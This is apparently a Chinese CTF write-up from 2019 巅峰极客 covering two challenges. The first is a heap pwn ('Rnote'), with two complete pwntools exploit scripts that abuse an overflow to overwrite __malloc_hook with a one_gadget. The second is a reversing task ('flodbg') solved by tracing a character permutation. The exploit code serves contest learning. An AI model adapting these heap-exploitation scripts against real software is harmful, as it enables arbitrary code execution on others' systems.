---
title: 19巅峰极客
author: nepire
avatar: '/images/title.ico'
authorLink: 'https://nepire.github.io/'
authorAbout: 逐梦者
authorDesc: 逐梦者
categories: 技术
comments: true
date: 2019-11-05 12:31:37
tags:
keywords:
description:
photos: /images/cover/6.png
---
重修补课一整天完全没时间去打，赛后复现时才发现不是很难的亚子（千万别挂科（哭



# Rnote
![图片](./QNWuZetg3XswZv07.png)


防护全开

IDA去分析下基本的功能

![图片](GndBMGdo28UiCd5t.png)

基本的菜单框架

![图片](0ynBuMLYm1AIod5U.png)


![图片](bhc2wEDZdEgbsMA1.png)


![图片](GzCaqcpPig4HZagd.png)


![图片](c7JpCQAZdxsHsfmY.png)


很容易在edit中看到有个很突兀的if语句，这就造成了一个7byte的溢出，并且没有对edit的块进行check是否free掉所以能考虑修改fastbin的fd为mallochook然后修改onegagdget，由于我们只能操作一个堆，但我们能创建最大的size为0x1000，所以想到用orange来创建一个unsortbin

![图片](B6Tbch25wsgyv34O.png)

之后的思路就很简单了

修改fd做uaf去修改malloc_hook为one_gadget

```python
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
n = process('./pwn')
elf=ELF('./pwn')
libc = elf.libc
def regs():
    n.recvuntil('name?')
    n.sendline("nepire")
def choice(idx):
    n.recvuntil('Your choice > ')
    n.sendline(str(idx))
def new(size,content):
    choice(1)
    n.recvuntil("Size >")
    n.sendline(str(size))
    n.recvuntil('Content > ')
    n.send(content)
def show():
    choice(2)

def free():
    choice(3)

def edit(size,content):
    choice(4)
    n.recvuntil("Size > ")
    n.sendline(str(size))
    n.recvuntil("Content > ")
    n.send(content)
regs()
new(0x18,'0000')
edit(0x18+7,'a'*0x18+p32(0xfe1))
new(0x1000,'1111')
new(0x68,'a'*8)
show()
libcbase = u64(n.recvuntil('\x7f')[-6:]+'\x00\x00')-0x3c5188
print hex(libcbase)
malloc_hook = libcbase + libc.sym['__malloc_hook']
one_gadget = libcbase + 0xf02a4
free()
edit(0x68,p64(malloc_hook-0x10+5-8))
new(0x68,'aaaa')
new(0x68,'aaa'+p64(one_gadget)*3)

choice(1)
n.recvuntil('>')
n.sendline('12')
n.interactive()
```
然后很蛋疼的是，我payload搓完后才有人和我说比赛的环境是18.04
本着懒但是要准确的态度重新搓了个payload

```python
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
n = process('./pwn')
elf=ELF('./pwn')
libc = elf.libc


def regs():
    n.recvuntil('name?')
    n.sendline("nepire")


def choice(idx):
    n.recvuntil('Your choice > ')
    n.sendline(str(idx))


def new(size,content):
    choice(1)
    n.recvuntil("Size >")
    n.sendline(str(size))
    n.recvuntil('Content > ')
    n.send(content)


def show():
    choice(2)


def free():
    choice(3)


def edit(size,content):
    choice(4)
    n.recvuntil("Size > ")
    n.sendline(str(size))
    n.recvuntil("Content > ")
    n.send(content)
regs()
new(0x18,'0000')
edit(0x18+7,'a'*0x18+p32(0xd91))
new(0x1000,'1111')
new(0x68,'a'*8)
show()
libcbase = u64(n.recvuntil('\x7f')[-6:]+'\x00\x00')-0x3ec2a0
print hex(libcbase)
malloc_hook  = libcbase + libc.sym['__malloc_hook']
one_gadget = libcbase + 0x4f322
free()
edit(0x68,p64(malloc_hook-0x10+1-0x8))
new(0x68,'aaaa')
new(0x68,'a'*7+p64(one_gadget)*3)
choice(1)
n.recvuntil('>')
n.sendline('114')
n.interactive()
```


# flodbg
各种反调试反反编译的一题，但是靠猜也很容易猜出来，这里就详细写一下怎么猜出来的

![图片](QoGGsTPPVVYcVCzP.png)


反编译后看main函数先是逐字符输入直到v3==&v7，也就是从[rbp-4D8]开始写，写到[rbp-48C]时停止，也就是76byte，由于这里是int就还要除4，也就是19个字符

![图片](qE61QUalT1gv6MIy.png)

接着是预定义一个长度为19的字符串，看到有flag和{}很容易猜到flag是由这串变化来的

![图片](OUJGTND4498mLH1k.png)

由于这里有个简单的反调试，所以先patch一下

patch前

![图片](OhmxUraAYtQfY1SW.png)


patch后

![图片](FGcdizEcPV8apsQB.png)


然后用gdb去调试就能发现其实是进行15轮func3的加密

```
0123456789abcdefghi 
func3(f[5],2,7,14)
0123456cdefghi789ab
func3(f[2],4,6,17)
012345defghi789ab6c
func3(f[9],3,5,10)
012345defghi9ab6c78
func3(f[0],6,9,15)
012345ghi9abdef6c78
func3(f[11],3,6,8)
012345ghi9abde78f6c
func3(f[5],1,5,14)
012345abde78f6cghi9
func3(f[0],0,2,19)
2345abde78f6cghi901
func3(f[3],3,5,16)
2345ab78f6cghi901de
func3(f[15],1,3,4)
2345ab78f6cghi90e1d
func3(f[8],3,6,11)
2345ab78f6c90e1dghi
func3(f[0],0,7,19)
8f6c90e1dghi2345ab7
func3(f[16],0,2,3)
8f6c90e1dghi23457ab
func3(f[10],0,2,9)
8f6c90e1dg23457abhi
func3(f[11],1,3,8)
8f6c90e1dg237abhi45
func3(f[16],0,2,3)
8f6c90e1dg237abh5i4
```
并且可以发现只是对输入的字符串进行移位，没有对字符本身进行操作，那最简单的就是对比然后替换

![图片](ZId6zKPNDTEjqaLY.png)

```
flag{My-StL_R0T@+3}
```
虽然这样能轻松拿到flag，但也得尊重下出题人写那么一大串加密是真的累，所以我们去分析这加密过程
先分析下第一次加密

简单调试就能得到这个结果

![图片](e20kChFhsdkuYqs5.png)


然后我们不难看出这个的通项

![图片](t2YIjVbUaM4wN1M2.png)


简单的用第二第三论证下

![图片](QVHXOsbtNG0uUEJE.png)


![图片](vC9J50k9Eq4VMKCA.png)


比赛时直接走捷径是爽，但赛后再一步步走还是挺有意思的

![图片](U9GDZsi5Vg4nYsnd.png)
